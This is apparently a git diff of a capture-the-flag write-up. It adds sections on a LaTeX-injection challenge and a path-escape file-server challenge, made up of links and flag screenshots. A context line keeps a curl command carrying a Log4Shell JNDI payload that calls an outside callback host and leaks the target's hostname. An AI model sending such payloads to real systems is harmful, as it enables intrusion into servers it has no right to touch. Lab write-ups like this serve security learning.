@@ -60,3 +60,19 @@ curl $URL -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.z5wbevl1c0v3t8gxs856
 
 ## Final flag
 ![flag](https://user-images.githubusercontent.com/45040001/162826580-8d33dcae-e97f-4cdc-9679-749646111c9b.png)
+
+
+# 0x2 texnology
+
+[POC](https://0day.work/hacking-with-latex/)
+
+![Screenshot 2022-04-09 040948](https://user-images.githubusercontent.com/45040001/162831563-36117819-1344-4196-afcc-3200b2cb6a43.png)
+![flag](https://user-images.githubusercontent.com/45040001/162831557-7e81bc96-5c76-4b23-ae58-c2057730f618.png)
+
+# 0x3 fil3serv3r
+
+![path_escape](https://user-images.githubusercontent.com/45040001/162831826-38411b88-b19b-4550-b6ab-c218a34e8b10.png)
+
+![flag](https://user-images.githubusercontent.com/45040001/162831828-1529c4d4-b02c-455e-9b7d-d5c0ccf095c2.png)
+
+
